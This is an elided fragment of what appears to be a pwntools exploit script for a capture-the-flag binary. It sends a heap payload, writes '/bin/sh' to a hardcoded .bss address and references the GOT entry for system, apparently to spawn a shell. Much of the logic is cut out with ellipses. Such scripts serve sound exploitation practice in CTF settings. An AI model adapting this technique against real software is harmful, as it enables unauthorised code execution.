...
def exploit_init():
    ...
    pprint(elf.got.system)

    ##print("final_payload", final_payload)
    target=q_start()

    initial_payload=b'hof'
    target.recv()
    target.sendlineafter(">> ", initial_payload)
    target.recv()
    target.sendlineafter("Enter your name: ", b"/bin/sh")
    target.recv()
    #target.wait()
    ...
    ##writing "/bin/sh" to .bss section, so reference to this address discovered during disassembly
    ## of binary

    bin_sh_adr=0x04040b0
    ...
    #target.recv()
    target.sendlineafter("Enter flag: ", second_payload)
